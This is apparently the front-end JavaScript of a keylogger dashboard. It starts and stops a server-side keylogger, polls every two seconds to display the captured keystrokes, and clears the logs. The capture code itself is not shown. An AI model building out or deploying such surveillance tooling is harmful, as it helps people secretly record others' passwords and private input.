let currentProcess = null;

function updateStatus(isActive) {
    const indicator = document.getElementById('statusIndicator');
    const statusText = document.getElementById('statusText');
    
    if (isActive) {
        indicator.className = 'status-indicator status-active';
        statusText.textContent = 'Active';
    } else {
        indicator.className = 'status-indicator status-inactive';
        statusText.textContent = 'Inactive';
    }
}

async function executeCommand() {
    const selectedOption = document.querySelector('input[name="control"]:checked');
    if (!selectedOption) {
        alert('Please select an option');
        return;
    }

    const command = selectedOption.value;
    const logDisplay = document.getElementById('logDisplay');

    try {
        if (command === 'start') {
            if (currentProcess) {
                alert('Keylogger is already running');
                return;
            }
            
            const response = await fetch('/start_keylogger', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            const data = await response.json();
            
            if (data.status === 'success') {
                currentProcess = true;
                updateStatus(true);
                logDisplay.textContent = 'Keylogger started successfully. Monitoring keystrokes...';
            } else {
                throw new Error(data.message);
            }
        } else if (command === 'stop') {
            if (!currentProcess) {
                alert('Keylogger is not running');
                return;
            }

            const response = await fetch('/stop_keylogger', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            const data = await response.json();
            
            if (data.status === 'success') {
                currentProcess = null;
                updateStatus(false);
                logDisplay.textContent = 'Keylogger stopped successfully.';
            } else {
                throw new Error(data.message);
            }
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred: ' + error.message);
        currentProcess = null;
        updateStatus(false);
    }
}

async function updateLogDisplay() {
    const logDisplay = document.getElementById('logDisplay');
    try {
        const response = await fetch('/get_logs');
        const data = await response.json();
        
        if (data.status === 'success') {
            logDisplay.textContent = data.logs || 'No keystrokes recorded yet.';
            logDisplay.scrollTop = logDisplay.scrollHeight;
        } else {
            throw new Error(data.message);
        }
    } catch (error) {
        console.error('Error fetching logs:', error);
        logDisplay.textContent = 'Error loading logs. Please try again.';
    }
}

async function clearLogs() {
    try {
        const response = await fetch('/clear_logs', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const data = await response.json();
        
        if (data.status === 'success') {
            const logDisplay = document.getElementById('logDisplay');
            logDisplay.textContent = 'Logs cleared successfully.';
            setTimeout(() => {
                updateLogDisplay();
            }, 1000);
        } else {
            throw new Error(data.message);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred while clearing logs: ' + error.message);
    }
}

// Update logs every 2 seconds if keylogger is active
setInterval(() => {
    if (currentProcess) {
        updateLogDisplay();
    }
}, 2000);

// Initial log display update
updateLogDisplay(); 